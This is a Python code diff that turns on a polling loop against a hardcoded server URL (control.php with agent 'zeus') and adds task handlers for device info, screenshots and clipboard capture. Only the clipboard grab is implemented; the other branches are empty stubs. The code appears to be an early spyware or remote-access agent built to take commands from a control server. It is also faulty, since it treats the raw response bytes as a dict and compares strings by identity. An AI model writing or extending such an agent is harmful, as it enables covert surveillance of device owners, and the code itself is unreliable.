@@ -7,7 +7,7 @@ except ImportError:
 
 import threading
 
-import datetime
+from Providers.DeviceInfoProvider import DeviceInfoProvider
 
 class TaskManagmentHandler():
     # Handle tasks from server
@@ -26,8 +26,20 @@ class TaskManagmentHandler():
         taskThread.start()
 
     def executeTaskFromServer(self):
-        # taskResponse = requests.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus&deviceID=xxxx").read()
-        print ("%s | hi!" % datetime.datetime.now())
+        taskResponse = requests.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus&deviceID=xxxx").read()
+
+        if taskResponse["task"]:
+            if taskResponse["task"] is "deviceInfo":
+                # Get device info
+                pass
+            elif taskResponse["task"] is "screenshot":
+                # Take screenshot
+                pass
+            elif taskResponse["task"] is "clipboard":
+                # Get clipboard data
+                devInfoProvider = DeviceInfoProvider()
+                clipboardData = devInfoProvider.getClipboardData()
+
 
         self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK
 
@@ -39,6 +51,5 @@ class TaskManagmentHandler():
 
 
 if __name__ == "__main__":
-    print ("%s | hello!" % datetime.datetime.now())
     taskMgr = TaskManagmentHandler()
     taskMgr.startTask()
